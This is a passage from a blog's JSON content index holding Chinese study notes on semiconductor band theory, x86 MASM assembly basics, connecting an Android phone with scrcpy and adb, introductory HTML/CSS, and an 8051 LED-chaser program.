电子在量子态上的分布电子填充量子态需遵从2个原则： 泡利不相容原理（计入自旋）：原子中每个量子态最多只能容纳一个电子 能量最低原理：原子中的电子，在不违背泡利不相容原理的前提下，总是先占据能量低的量子态 晶体中的电子状态–能带电子共有化运动： 原子靠近组成晶体，越外层的层壳交叠越多 电子不再局限于某一原子，可以转移到相邻原子上 电子的转移只能在不同原子的相似壳层 电子共有化运动 —&gt; 分裂出若干个相近的能级 —&gt; 形成一个准连续的能带 能带重组： 绝对零度时（0K），半导体、绝缘体、金属的能带区别半导体，绝缘体，金属能带的区别： 绝缘体：导带是空带，价带是满带，禁带距离大 半导体：导带是空带，价带是满带，禁带距离小 金 属：导带是半满，价带是满带，禁带距离无 电子从价带跃迁到导带，使晶体拥有导电特性 满带、空带：不导电 半满带：导电 绝缘体和半导体结构类似，在0K时不导电， 在室温环境下，由于本征激发，半导体有一定的导电性（掺杂之后可以强导电） 半导体中电子的状态和能带单电子近似：晶体中的电子是在晶格的周期性势场（原子核与电子的平均势场）中运动的 布洛赫定理：","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"半导体物理学习笔记","slug":"学习笔记/半导体物理学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8D%8A%E5%AF%BC%E4%BD%93%E7%89%A9%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础10--使用函数","date":"2020-04-18T06:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础10--使用函数/","text":"汇编基础10 – 使用函数函数编写函数格式： 123function proc codefunction endp 传参方式： 寄存器 堆栈 函数调用调用指令：CALL 格式：CALL OPRD 相当于： 12push EIPjmp OPRD 返回指令：RETN 格式：RETN 相当于： 12pop EIPjmp EIP 函数调用会先push eip，跳转到函数进行调用，调用完后再pop eip 示例1：通过栈传递参数 123456789101112131415161718.586.MODEL flat,stdcall.codeaddx proc mov eax ,[esp+4] ;先进栈的，地址位置大，后进的，地址小（小端序） mov ebx ,[esp+8] add eax ,ebx retnaddx endpmain proc push 1 push 2;通过栈传参 call addx mov eax ,eaxmain ENDPEND main 示例2：通过寄存器传递参数 12345678910111213141516.586.MODEL flat,stdcall.codeaddx proc add eax ,ebx retnaddx endpmain proc mov eax ,2 mov ebx ,1 call addx mov eax ,eaxmain ENDPEND main 示例3：加减乘除函数 12345678910111213141516171819202122232425262728293031323334353637383940.586.MODEL flat,stdcall.codeaddx proc add eax ,ebx retnaddx endpsubt proc sub eax ,ebx retnsubt endpmult proc mov ebx,[esp+4] mul ebx retmult endpdivi proc div ebx mov ah,ah mov al,al retdivi endpmain proc mov eax ,2 mov ebx ,2 push 15 call addx call subt call mult mov ebx ,1;把ebx清0，方便观察看出栈数据 pop ebx call divi mov eax ,eaxmain ENDPEND main 示例4：使用寄存器作为参数 123456789101112131415161718addx proc uses esi ecx ;函数中使用寄存器（用完之后用的寄存器会回复原来的值） add esi ,ecx ;mov ecx ,22 mov eax ,esi ;这里需要把结果保存到其他寄存器里 retaddx endpmain proc mov esi ,5 mov ecx ,1 push esi push ecx call addx push 0 call ExitProcessmain endpEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础12--数组和结构体","date":"2020-04-18T06:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础12--数组和结构体/","text":"汇编基础12 – 数组和结构体数组的声明和使用： 1234567891011121314151617181920212223.586.MODEL flat ,stdcall.Datavalu dd 11,22,33;声明并初始化有三个元素的 DWORD 数组; 该数组每个元素是 4 字节;也可以按如下方式写;valu dd 11; dd 22,33.Codemain PROC mov eax,valu ;0x0B mov eax,valu[4] ;0x16 mov eax,valu[8] ;0x21; mov eax,valu[4*0] ;0x0B; mov eax,valu[4*1] ;0x16; mov eax,valu[4*2] ;0x21 mov [valu+4],5 mov ebx ,[valu+4] mov eax,eaxmain ENDPEND main 使用伪指令DUP： 123456789101112131415.586.MODEL flat ,stdcall.Datavalu dd 3 dup(0);用于初始化数组.Codemain PROC mov eax,valu mov eax,valu[4] mov eax,valu[8] mov eax,eaxmain ENDPEND main 参考资料 学 Win32 汇编6: 伪指令 DUP 与数组","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础11--win32汇编","date":"2020-04-18T06:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础11--win32汇编/","text":"汇编基础11 – win32汇编控制台程序的输入输出消息框API：（Application Programming Interface，应用程序接口）是一些预先定义的函数，或指软件系统不同组成部分衔接的约定。 [1] 目的是提供应用程序与开发人员基于某软件或硬件得以访问一组例程的能力，而又无需访问原码，或理解内部工作机制的细节。 win32汇编是通过使用Windows提供的接口进行编程 示例：hello world！ 123456789101112131415161718192021222324252627.586.MODEL flat,stdcallincludelib user32.libincludelib kernel32.lib;声明函数ExitProcess PROTO, dwExitCode:DWORDMessageBoxA PROTO, hWnd:DWORD ,lpText:BYTE ,lpCaption:BYTE ,uType:DWORD;参数从栈中调用出来，左边的参数在栈下面，右边的在上面.datastr1 db &quot;Hello world&quot; ,0;需要,0结尾，不然出错;db是一个占了8位的类型，db后面的内容视为数据而不视为代码.codemain proc push 1 lea eax ,str1 push eax push eax push 0 call MessageBoxA add esp ,16 ;堆栈平衡 invoke ExitProcess,0main ENDPEND main 最常用的一个工具是MASM32，网上搜索，下载，安装 找到目录下的include,和lib目录添加到配置里： 在vs2015里右键项目名称–属性： 链接器–常规–附加库目录 Microsoft Macro Assmble–General–include Path C的库函数输出用到的库：msvcrt 1234567891011include msvcrt.incincludelib msvcrt.lib.data text db &quot;hello world !&quot;,0.codemain proc push offset text call crt_printf add esp ,4main endpEND main 输入 1234567891011121314include msvcrt.incincludelib msvcrt.lib.data format db &quot;%s&quot;,0 text1 db 0.codemain proc push offset text1 push offset format call crt_scanf ;输入 call crt_printf add esp ,8main endpEND main 示例：输入两个数，输出两数之和12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455.586.model flat ,stdcalloption casemap:noneinclude kernel32.incinclude user32.incinclude msvcrt.incincludelib kernel32.libincludelib user32.libincludelib msvcrt.lib.data text db &quot;请输入两个数：&quot;,0dh,0ah,0 text1 db &quot;两个数的和为：&quot;,0 format db &quot;%s&quot;,0 format_num db &quot;%d&quot;,0 num1 db 0,0,0,0 num2 db 0,0,0,0.codemain proc push offset text call crt_printf add esp ,4 push offset num1 push offset format_num call crt_scanf add esp ,8 push offset num2 push offset format_num call crt_scanf add esp ,8 mov eax ,dword ptr num1 add eax ,dword ptr num2 push eax push offset format_num push offset text1 push offset format call crt_printf add esp ,8 call crt_printf add esp ,8 push 0 call ExitProcess add esp ,4main endpEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础09--传送指令","date":"2020-04-17T23:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础09--传送指令/","text":"汇编基础09 – 传送指令指令：MOVS 格式：MOVS OPRD1,OPRD2 功能：把DS:SI指向的存储单元中的数据装入ES:DI指向的存储单元中，然后根据DF标志分别增减SI和DI 示例 1234567891011.586.MODEL flat,stdcall.codemain proc mov edi ,esp mov dword ptr ss:[esp],0;给edi清零 mov esi ,ebp movs dword ptr es:[edi],dword ptr ds:[esi];把esi中的数据存储到edi中 mov eax ,eaxmain ENDPEND main 寄存器存储的是内存地址，内存地址里存储的是数据 使用loop也可以实现一点内存中的数据传送： 12345678910111213141516.data sstr byte &quot;hello selph!&quot;,0 tstr byte sizeof sstr dup(0).codemain proc xor esi ,esi mov ecx ,sizeof sstrlp: mov al ,sstr[esi] mov tstr[esi] ,al inc esi loop lp push 0 call ExitProcessmain endpEND main 指令：STOS 格式：STOS OPRD 功能：把AL/AX/EAX/RAX等中的数据存储到DI/EDI（这种为目的串的地址）中，每次执行后，会根据DF的值进行自动调整 把AL或AX中的数据装入ES:DI指向的存储单元，然后根据DF标志增减DI 示例： 12345678910.586.MODEL flat,stdcall.codemain proc mov eax,11223344 mov edi ,esp stos dword ptr es:[edi] mov eax ,eaxmain ENDPEND main 将EAX的值放到目的地址中 指令：REP 格式：REP 功能：重复其后的字符串操作指令。重复前先判断CX是否为0，为0就结束重复，否则CX减1，重复其后的串操作指令。主要用在MOVS和STOS前。一般不用在LODS前。 示例： 12345678910111213.586.MODEL flat,stdcall.codemain proc mov ecx,4 mov edi ,esp mov dword ptr ss:[esp],0;给edi清零 mov esi ,ebp movs dword ptr es:[edi],dword ptr ds:[esi] rep movsb mov eax,eaxmain ENDPEND main 将esi的4个位传送到edi，每重复一次，往后多传送一位","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础08： JCC 转移指令","date":"2020-04-17T22:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础08--JCC指令/","text":"汇编基础08： JCC 转移指令常用的JCC指令 JMP：无条件跳转 JZ/JE：ZF =1,也就是比较结果=0[cmp通过相减的方式进行比较(相等)]时跳转 JNZ/JNE：ZF =0，也就是比较结果≠0（不相等）时跳转 JBE/JNA：CF=1/ZF=1 ，低于等于/不高于等于跳转(前面数小于等于后面数) JNBE/JA：CF=0/ZF=0 ，不低于等于/高于等于跳转（前面数大于等于后面数） JL/JNGE：SF!=OF ，小于/不大于等于跳转 JNL/JGE：SF=OF ,不小于/大于等于跳转 注意： 使用JCC指令的时候，前面不要跟影响标志位的指令 一般JCC和CMP指令一起用 JCC指令表","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"使用电脑控制手机","date":"2020-04-17T07:38:51.000Z","path":"wiki/折腾笔记/手机连接电脑/使用电脑控制手机/","text":"使用电脑控制 Android 手机scrcpy（适用Windows、Linux、MacOS）scrcpy 是免费开源的投屏软件，支持将安卓手机屏幕投放在 Windows、macOS、GNU/Linux 上，并可直接借助鼠标在投屏窗口中进行交互和录制。 项目地址：https://github.com/Genymobile/scrcpy Windows软件下载：https://github.com/Genymobile/scrcpy/releases/download/v1.12.1/scrcpy-win64-v1.12.1.zip Windows 下 有线连接 手机开启开发者模式 手机开启USB调试模式 手机和电脑通过数据线连接 双击软件中的scrcpy.exe 即可完成有线连接下的电脑控制手机（手机投屏电脑） Windows 下 无线连接1234567891011# a.将代码目录定位到 scrcpy 文件夹cd D:\\Libraries\\Desktop\\scrcpy-win64-v1.12.1# b.在手机端开启「开发者选项」及「USB 调试」，然后使用数据线将手机和电脑连接并允许 USB 调试，开启手机端口.\\adb tcpip 5555# c.拔出手机数据线，开始无线投屏。(192.168.2.234 为手机端 ip，需更改).\\adb connect 192.168.2.234:5555# d.启动 scrcpy.exe.\\scrcpy 参考资料 scrcpy - 手机无线投屏到电脑","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"手机连接电脑","slug":"折腾笔记/手机连接电脑","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E8%BF%9E%E6%8E%A5%E7%94%B5%E8%84%91/"}]},{"title":"汇编基础07：比较指令","date":"2020-04-11T07:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础07--比较指令/","text":"汇编基础07：比较指令CMP 格式：CMP OPRD1,OPRD2 功能：对两个数进行相减，进行比较 作用：影响标志位 测试代码： 1234567891011121314.586.MODEL flat,stdcall.codemain proc mov eax ,5 mov ebx ,4 cmp eax ,ebx cmp eax ,5 cmp eax ,ebx cmp eax ,6 cmp eax ,ebx mov eax ,eaxmain ENDPEND main 结果： 当OPDR1 &gt; OPDR2 时：PL=0 ，ZR=0，AC=0，CY=0，PE=0 当OPDR1 = OPDR2 时：PL=0 ，ZR=1，AC=0，CY=0，PE=1 当OPDR1 &lt; OPDR2 时：PL=1 ，ZR=0，AC=1，CY=1，PE=1 TEST 格式：TEST OPRD1,OPRD2 功能：与AND相同，但结果直接抛弃，对标志位进行重新置位","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"前端入门01--HTML和CSS基础","date":"2020-04-06T17:17:33.000Z","path":"wiki/学习笔记/前端入门学习笔记/前端入门01--HTML&CSS基础/","text":"前端入门 01 – HTML和CSS基础环境准备编辑器： VS Code 插件： City Lights Theme Live Server prettier vim HTML 最基础的结构123456&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 引用 CSS 样式有三种方式引用CSS： 内部引用，CSS比较少时，写在一个文件中看起来方便，或者用在复杂的覆盖层级 1&lt;style&gt;&lt;/style&gt; 外部引用，写在单独一个文件时比较方便，使用在CSS较多时，或者用他人CSS时 1&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"./style.css\"&gt; 内联样式，作为元素的style属性，常用于覆盖其他样式 123&lt;div style=\"width:50px;\" class=\"red\"&gt; hello world&lt;/div&gt; 内部引用样式优先级顺序取决于写在style标签里的先后顺序，写在后面的会覆盖写在前面的样式 三种样式引用优先级顺序为：内联样式 &gt; 内部样式 &gt; 外部样式 样式选择器 id选择器：选取id属性，例如：#red 类选择器：选取class属性，例如：.red 类型选择器：选取元素类型，例如：div CSS 基本写法基本格式：选择器 + {属性;} 1234.red &#123; background-color:red; width:50px;&#125; 属性名称中带有- 的为子属性 让元素横着排列：向CSS中添加flex属性 1display:flex 改变元素轴向分布：使用justify-content属性 12居中对齐justify-content:center 加边框：使用border属性 12border-width:10px;border-style:solid; 使用flex居中： 123display: flex;justify-content: center;align-items: center; 盒模型待补充","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"前端入门学习笔记","slug":"学习笔记/前端入门学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"51单片机入门01--LED流水灯","date":"2020-04-04T15:27:19.000Z","path":"wiki/学习笔记/51单片机学习笔记/51单片机入门01--LED流水灯/","text":"51单片机入门01–LED流水灯实验环境 Protues Keil 电路图 能流过LED的电流大概是20mA，所以需要加大于250Ω的电阻 仿真软件单片机内部自带复位和时钟电路 代码延时程序：通过空执行循环来达到延时的效果，120次大概是1ms 123456void delay(unsigned int n)&#123; unsigned int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;&lt;j++); &#125;&#125; LED流水灯程序：通过移位来实现流水灯功能 1234567891011121314151617void led1()&#123; int i=0; for(i=0;i&lt;9;i++)&#123; P2=~(0x01&lt;&lt;i);//0000 0001 --&gt; 0000 0010 --&gt; 0000 0100 delay(200); &#125;&#125;void led2()&#123; int i=0; for(i=0;i&lt;8;i++)&#123; P1=0x01&lt;&lt;i; delay(200); &#125; P1 = 0x00;&#125; led1函数为共阳的8个led进行流水灯操作 led2函数为共阴的8个led进行流水灯操作 led2函数执行完之后，P1.7端口依然处于高电平，此处用P1 = 0x00；来熄灭 完整代码： 12345678910111213141516171819202122232425262728293031323334353637#include\"reg51.h\"//头文件有两种写法，还有一种是通过&lt;reg51.h&gt;来导入，系统会从默认路径找头文件，通过“”是从用户定义路径查找，然后再去系统路径查找void delay(unsigned int n)&#123; unsigned int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125;void led1()&#123; int i=0; for(i=0;i&lt;9;i++)&#123; P2=~(0x01&lt;&lt;i);//0000 0001 --&gt; 0000 0010 --&gt; 0000 0100 delay(200); &#125;&#125;void led2()&#123; int i=0; for(i=0;i&lt;8;i++)&#123; P1=0x01&lt;&lt;i; delay(200); &#125; P1 = 0x00;&#125;void main()&#123; P1 = 0x00; while(1)&#123; led1(); led2(); &#125;&#125; 主程序里，先将与P1连接的灯全部熄灭再进行16个led的流水灯操作比较好看 流水灯的通用实现方法 12345678910111213141516171819202122232425#include \"reg51.h\"unsigned char leddat[]=&#123;0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80&#125;;void delay(unsigned int n)&#123; unsigned int i=0,j=0; for(i=0;i&lt;n;i++)&#123; for(j=0;j&lt;120;j++); &#125;&#125; void led()&#123; int i=0; for(i=0;i&lt;8;i++)&#123; P2=~leddat[i]; delay(100); &#125;&#125;void main()&#123; while(1)&#123; led(); &#125;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"51单片机学习笔记","slug":"学习笔记/51单片机学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础06：数据传送指令","date":"2020-04-04T15:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础06--数据传送指令/","text":"汇编基础06：数据传送指令MOV指令格式：MOV OPDR1,OPDR2 功能：将一个源操作数传送到目的操作数中 OPDR1为目的操作数，可以使寄存器、存储器、累加器 OPDR2为源操作数，可以使寄存器、存储器、累加器、立即数 操作数位数需要相同 示例： 123456789.586.MODEL flat, stdcall.codemain proc mov eax ,1 mov ebx ,eax mov eax ,eaxmain ENDPEND main mov指令有这么五种情况 12345mov reg ,regmov mem ,regmov reg ,memmov mem ,immmov reg ,imm 从内存存到内存需要一次中转 12mov reg ,memmov mem ,reg 把低位的值赋给高位的寄存器 1234mov reg32 ,reg 16;mov eax ,cxmov eax ,FFFFFFFF ;初始化mov ax ,cx ；赋值 MOVZXmov进行全0扩展和数据传送 会把位数不够的值进行0填充（二进制） 12mov eax,cx;正常会出错movzx eax,cx MOVSX填充1（二进制），类似movzx LAHF把flag复制到ah里 1lahf SAHF把ah复制到flag里 LEA指令有效地址传送指令 格式：LEA OPDR1,OPDR2 功能：将源操作数给出的有效地址传送到制定寄存器中 OPDR1必须是寄存器 将OPDR2的内存地址给了OPDR1 示例： 12345678.586.MODEL flat, stdcall.codemain proc lea eax ,dword ptr ss:[esp-4] mov eax ,eaxmain ENDPEND main XCHG指令数据交换指令 格式：XCHG OPDR1, OPDR2 功能，两个操作数的值互换 只有内存和寄存器参与 示例： 12345678.586.MODEL flat, stdcall.codemain proc xchg eax ,dword ptr ss:[esp-4] mov eax ,eaxmain ENDPEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础05：堆栈","date":"2020-04-04T14:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础05--堆栈/","text":"汇编基础05：堆栈栈 栈是一种后进先出的存储区域，位于堆栈段中，SS段寄存器描述的就是堆栈段的段地址 栈的数据出口位于栈顶，也就是esp寄存器指向的位置 栈顶是低位，也就是地址较小的一侧，由ebp寄存器指向栈底，不会改变 作用： 存储少量数据 保存寄存器环境 传递参数 栈操作PUSH：压栈指令，32位汇编首先ESP-4，留出一个空间，然后把要压入栈中的内容压入 POP：出栈指令，32位汇编首先将栈顶的数据弹出给指定目标，然后ESP+4，清理空间 pushfd：把eflags压栈 popfd：把eflags出栈 pushad：压栈寄存器 顺序：eax,ecx,edx,ebx,esp,ebp,esi,edi popad：出栈寄存器 pusha：进16位 popa 示例：反转字符串12345678910111213141516171819202122232425.data sstr byte &quot;hello world 1234567!&quot;,0 sstrsize &#x3D; ($ - sstr) - 1 ;等号伪指令，类似于EQU，用于定义常量，但定义的变量可以重新定义.codemain proc xor esi ,esi mov ecx ,sstrsizel1: movzx eax ,sstr[esi] push eax inc esi ;esi作为数组下标使用 loop l1 xor esi ,esi mov ecx ,sstrsizel2: pop eax mov sstr[esi] ,al inc esi loop l2 push 0 call ExitProcessmain endpEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础04：循环","date":"2020-04-04T13:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础04--循环/","text":"汇编基础04：循环循环控制指令：LOOP 格式：LOOP 标号 功能：(CX) &lt;–（CX）-1，（CX）&lt;&gt;0，则转移至标号处循环执行，直至(CX)=0，继续执行后续指令 LOOP执行一次，cx-1，如果cx=0，则会无限循环 示例： 12345678910111213.586.MODEL flat, stdcall.codemain proc mov eax ,1 mov ebx ,1 mov ecx ,3s: add eax ,ebx loop s mov eax ,eaxmain ENDPEND main 练习：1+2+3+…+100 123456789101112.586.MODEL flat, stdcall.codemain proc mov eax ,0 mov ecx ,100s: add eax ,ecx loop s mov eax ,eaxmain ENDPEND main 练习：1+2+4+8+….+2147483648(0x80000000) 123456789101112131415.586.MODEL flat, stdcall.codemain proc mov eax ,1 mov ebx ,0 mov ecx ,32s: mov edx ,2 add ebx ,eax mul edx loop s mov eax ,eaxmain ENDPEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础03：数学运算&逻辑运算","date":"2020-04-04T12:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础03--数学运算&逻辑运算/","text":"汇编基础03：数学运算&amp;逻辑运算数字运算进制度量单位 加法加法指令：ADD 格式：ADD OPRD1 ,OPRD2 功能：两数相加 加法指令运算结果对CF，SF，OF，PF，ZF，AF都有影响，不允许OPRD1 和OPRD2同时为存储器 带进位的加法指令：ADC 功能：OPDR1= OPDR1 + OPDR2 + CF 结果放在操作数1里 示例： 12345678910.586.MODEL flat, stdcall.codemain proc mov eax ,5 mov ebx ,5 add eax ,ebx mov eax ,eaxmain ENDPEND main 减法减法指令：SUB 格式：SUB OPRD1,OPRD2 功能：两个操作数相减，从OPDR1中减去OPDR2，结果保存在OPDR1中 立即数不能用于目的操作数，两个存储器之间的操作数之间不能直接相减，操作数可为8位或16位的无符号数或带符号数 带借位减法指令：SBB 格式：SBB OPDR1,OPDR2 功能：OPDR1 = OPDR1 - OPDR2 -CF 示例： 12345678910.586.MODEL flat, stdcall.codemain proc mov eax ,15 mov ebx ,5 sub eax ,ebx mov eax ,eaxmain ENDPEND main 乘法无符号位乘法指令：MUL 格式：MUL OPDR 带符号位乘法指令：IMUL 格式：IMUL OPDR 功能：乘法操作 OPDR位通用寄存器或存储器操作数 本指令影响标志位：CF，OF 乘法指令是将操作数*EAX，并将结果返回EAX，所以只需要一个操作数 示例： 12345678910.586.MODEL flat, stdcall.codemain proc mov eax ,2 mov ebx ,5 mul ebx mov eax ,eaxmain ENDPEND main 除法【待解决疑问】无符号位除法指令：DIV 格式：DIV OPDR 有符号位除法指令：IDIV 格式：IDIV OPDR 功能：实现两个带符号数的二进制除法运算 16bit的被除数，商放在AL，余数放在AH 32bit的被除数，商放在AX，余数放在DX 64bit的被除数，商放在EAX，余数放在EDX 128bit的被除数，商放在RAX，余数放在RDX 示例： 123456789101112.586.MODEL flat, stdcall.codemain proc mov ax,1000 mov bl,50 div bl mov ah,ah mov al,al mov eax,eaxmain ENDPEND main 出现的问题： vs2015里面不能看到变量的变化 自增+1指令：INC 格式：INC OPDR 功能：OPDR = OPDE +1 示例： 12 自减-1指令：DEC 格式：DEC OPDR 功能：OPDR = OPDE -1 逻辑运算 与指令：AND 格式：AND OPDR1，OPDR2 影响标志位PF、SF、ZF，使CF = 0 ，OF= 0 主要用于修改操作数或置某些位为零 或指令：OR 格式：OR OPDR1，OPDR2 异或指令：XOR 格式：XOR OPDR1，OPDR2 非指令：NOT 格式：NOT exp neg mem转换成二进制补码,也就是补码+1","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础02：第一个程序","date":"2020-04-04T11:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础02--第一个程序/","text":"汇编基础02：第一个程序Visual Studio 2015 使用：创建汇编项目： 新建项目 模板 ， Visual C++ ， Win32， 控制台程序 名称随便起，确定 选中项目右键“生成自定义”，选择MASM生成规则 右击右边的资源管理器中的源文件，添加，新建项，新建一个.asm后缀的新文件 选中项目右键–属性–链接器–系统–子系统选&lt;控制台(SUBSYSTEM:CONSOLE)&gt; 选中项目右键–属性–链接器–高级–入口点–填写 “main” 写代码运行即可 调试汇编程序： 右击项目名称，选择重新生成，然后点上面工作栏的本地Windows调试器即可 可进行断点执行 通过调试的窗口中可将寄存器显示调出来 高亮插件： 菜单栏–工具–扩展和更新 联机–搜索AsmDude–安装 第一个程序：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354.586;指定指令集，工作在386版本的都行.MODEL flat, stdcall;使用的内存模式：flat（win32使用的内存模式）;函数调用约定：stdcall（用于win32 API）includelib user32.libincludelib kernel32.lib;导入库ExitProcess PROTO, dwExitCode : DWORDMessageBoxA PROTO hWnd : DWORD, lpText : BYTE , lpCaption : BYTE, uType : DWORD;声明的win32API的原型;这里还能写option语句;option casemap:none ;制定是否大小写敏感;段;.data，生成的时候占用空间;.data?未初始化数据段;const常量段，可以读不能写;code代码段，不可写;stack堆栈段，可读可写可执行.dataNumber DWORD 0text db &quot;hello 